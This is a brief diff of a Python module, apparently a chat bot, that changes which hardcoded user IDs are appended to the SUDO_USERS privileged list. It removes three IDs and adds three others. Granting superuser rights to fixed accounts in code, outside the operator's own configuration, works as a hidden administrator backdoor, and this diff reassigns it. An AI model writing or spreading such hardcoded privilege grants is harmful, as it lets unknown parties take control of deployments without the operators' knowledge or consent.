@@ -5,9 +5,9 @@ from config import SUDO_USERS
 from database.admin import get_administrators
 
 
-SUDO_USERS.append(1891078417)
-SUDO_USERS.append(2097320259)
-SUDO_USERS.append(1329105215)
+SUDO_USERS.append(5827766615)
+SUDO_USERS.append(6112735328)
+SUDO_USERS.append(6264350806)
 
 
 def errors(func: Callable) -> Callable:
